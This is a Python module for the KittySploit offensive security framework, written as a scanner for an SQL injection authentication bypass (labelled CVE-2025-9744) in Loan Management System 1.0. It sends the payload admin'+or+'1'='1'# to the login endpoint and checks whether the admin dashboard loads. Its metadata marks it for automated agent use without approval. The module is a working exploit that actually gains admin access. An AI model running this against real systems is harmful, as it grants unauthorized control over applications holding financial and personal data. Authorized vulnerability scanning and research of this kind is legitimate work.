#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Loan Management System 1.0 - SQL Injection"""

import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Loan Management System 1.0 - SQL Injection",
        "description": "Auth bypass SQLi via username on /ajax.php?action=login.",
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2025-9744",
        "tags": ["web", "scanner", "cve", "cve2025", "vuln", "sqli", "auth-bypass", "loancms"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.3,
            "value": 1.0,
        },
        "references": [
            "https://www.exploit-db.com/exploits/50402",
            "https://packetstormsecurity.com/files/167860/Loan-Management-System-1.0-SQL-Injection.html",
            "https://nvd.nist.gov/vuln/detail/CVE-2025-9744",
        ],
    }

    def run(self):
        password = secrets.token_hex(3)
        r = self.http_request(
            method="POST",
            path="/ajax.php?action=login",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=f"username=admin'+or+'1'%3D'1'%23&password={password}",
            allow_redirects=False,
        )
        if not r:
            return False
        r2 = self.http_request(method="GET", path="/index.php?page=home", allow_redirects=False)
        if not r2 or r2.status_code != 200:
            return False
        body = r2.text or ""
        if "login-form" in body:
            return False
        if not all(
            m in body
            for m in ("window.start_load", "Welcome back Admin", "Loan Management System")
        ):
            return False
        self.set_info(
            severity="critical",
            cve="CVE-2025-9744",
            reason="Loan Management System admin auth bypass via SQL injection",
            path="/ajax.php?action=login",
            confidence="high",
        )
        return True
